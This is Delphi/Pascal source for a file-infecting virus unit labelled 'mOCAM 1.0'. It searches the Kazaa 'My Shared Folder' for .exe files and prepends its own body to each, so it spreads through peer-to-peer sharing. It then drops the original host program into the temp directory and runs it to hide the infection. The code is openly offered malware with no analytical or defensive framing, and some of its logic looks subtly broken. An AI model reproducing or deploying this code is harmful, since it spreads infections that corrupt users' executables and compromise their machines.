   UNIT prep;

   INTERFACE

   PROCEDURE DropFile;
   PROCEDURE InfectKazaaDir;
   FUNCTION  KazaaDir : STRING;
   PROCEDURE Prepend(Virus,DestinationFile:STRING);

   IMPLEMENTATION

   USES
     ACLUtils, Windows, PEFile;

   VAR
     VX                : FILE;
     VXPos             : Longint;
     VXSize            : Longint;
     VXBuf             : AnsiString;

   FUNCTION KazaaDir : STRING;
   BEGIN
     Result:='---- mOCAM 1.0 ----';
     Result:='c:\program files\kazaa\my shared folder\';
   END;

   FUNCTION TempPath : STRING;
   VAR
     I : WORD;
     S : ARRAY [1..MAX_PATH] OF Char;
   BEGIN
     ZeroMemory(@S[1],MAX_PATH);
     I:=GetTempPath(MAX_PATH,@S);
     IF I>0 THEN FOR I:=1 TO I DO Result:=Result+S[I];
   END;

   PROCEDURE Prepend(Virus,DestinationFile:STRING);
   VAR
     A        : FILE;
     TempFile : STRING;
     L        : Longint;
     Buf      : AnsiString;
   BEGIN
     {$I-}
     AssignFile(A,DestinationFile);
     FileMode:=0;
     Reset(A,1);
     L:=FileSize(A);
     SetLength(Buf,L);
     BlockRead(A,Buf[1],L);
     CloseFile(A);
     IF GetFileSize(Cardinal(@Buf[1]))<>VXSize THEN BEGIN
       FileMode:=2;
       Reset(A,1);
       Seek(A,0);
       BlockWrite(A,VXBuf[1],VXSize);
       IF IOResult=0 THEN BEGIN
         BlockWrite(A,Buf[1],L);
       END;
       CloseFile(A);
     END;
     {$I+}
     DeleteFile(pChar(TempFile));
   END;

   PROCEDURE DropFile;
   VAR
     G : FILE;
     S : STRING;
   BEGIN
     {$I-}
       IF VXPos>0 THEN BEGIN
         S:=TempPath+ExtractFileName(ParamStr(0));
         AssignFile(G,S);
         Rewrite(G,1);
         TRY
           BlockWrite(G,VXBuf[VXPos+1],Length(VXBuf)-VXPos+1);
           CloseFile(G);
           WinExec(pChar(S),SW_SHOW);
         EXCEPT
         END;
       END;
     {$I+}
   END;

   PROCEDURE InfectKazaaDir;
   VAR
     Error : Integer;
     D     : TSearchRec;
   BEGIN
     Error:=FindFirst(KazaaDir+'*.exe',faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       Prepend(ParamStr(0),KazaaDir+D.Name);
       Error:=FindNext(D);
     END;
   END;

   INITIALIZATION
   BEGIN
     AssignFile(VX,ParamStr(0));
     FileMode:=0;
     Reset(VX,1);
     SetLength(VXBuf,FileSize(VX));
     BlockRead(VX,VXBuf[1],FileSize(VX));
     VXPos:=GetFileSize(Cardinal(@VXBuf[1]));
     IF VXPos=Length(VXBuf) THEN BEGIN
       VXPos:=0;
       VXSize:=FileSize(VX);
     END ELSE VXSize:=VXPos;
     CloseFile(VX);
   END;


   END.
